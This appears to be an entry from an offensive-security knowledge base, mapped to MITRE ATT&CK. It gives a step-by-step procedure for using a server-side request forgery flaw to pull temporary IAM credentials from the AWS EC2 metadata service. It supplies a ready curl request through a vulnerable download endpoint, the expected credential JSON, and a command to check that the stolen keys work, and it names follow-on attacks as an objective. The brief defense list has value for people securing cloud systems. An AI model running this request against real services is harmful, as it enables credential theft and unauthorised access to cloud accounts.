---
tags:
  - ssrf
  - aws
  - credentials
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-extract-aws-credentials]]'
platforms:
  - Web
  - AWS
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
id: 29127288-6e13-442b-b9ce-e612ba23d489
created_at: '2025-12-14T03:46:09.162Z'
updated_at: '2025-12-14T03:46:09.162Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-AWS-Security-Credentials-via-SSRF

## Summary

This procedure exploits SSRF to directly fetch temporary AWS IAM credentials from the EC2 instance metadata service, exposing AccessKeyId, SecretAccessKey, and Token for unauthorized resource access.

## Description

Building on metadata enumeration, this targets the specific IMDS path for security credentials. In the reported vulnerability, the endpoint /api/v1/download-url allowed access to http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance, leaking session tokens valid for AWS actions. This enables lateral movement or data exfiltration in the cloud environment.

## Requirements

1. Confirmed SSRF access from prior steps
2. Target instance attached to an IAM role with credentials
3. Ability to parse JSON responses

## Defense

Defensive measures and detection strategies:

- Enforce IMDSv2 with hop limit to prevent SSRF access
- Rotate IAM roles and monitor credential usage via CloudTrail
- Block outbound requests to metadata IPs in application code

## Objectives

1. Retrieve temporary security credentials
2. Validate credentials for AWS API access
3. Enable follow-on attacks like resource enumeration

## Instructions

### Step 1: Request Credentials Endpoint

**Context**: Send a targeted SSRF request to the credentials path to exfiltrate the sensitive data.

**Command** ([[commands/curl-extract-aws-credentials]]):
```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
```

> This extracts the credentials. Expected output is JSON: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}. Test with AWS CLI: aws sts get-caller-identity.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-extract-aws-credentials]]

## Tools Used


## Tags

- [[ssrf]]
- [[aws]]
- [[Credentials]]
- [[Exfiltration]]
